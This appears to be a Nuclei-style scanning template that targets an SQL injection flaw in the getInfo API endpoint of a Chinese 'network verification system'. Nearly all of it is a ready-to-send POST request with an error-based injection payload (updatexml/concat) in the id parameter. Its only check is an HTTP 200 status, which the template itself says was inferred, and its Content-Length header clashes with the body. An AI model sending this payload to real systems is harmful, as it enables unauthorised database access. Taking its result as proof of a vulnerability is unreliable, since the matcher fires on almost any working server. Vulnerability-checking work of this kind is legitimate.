id: poc-sqgd1z0dplo77251
info:
  name: 网络验证系统getInfo参数存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /index.php/api/Software/getInfo HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 0

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
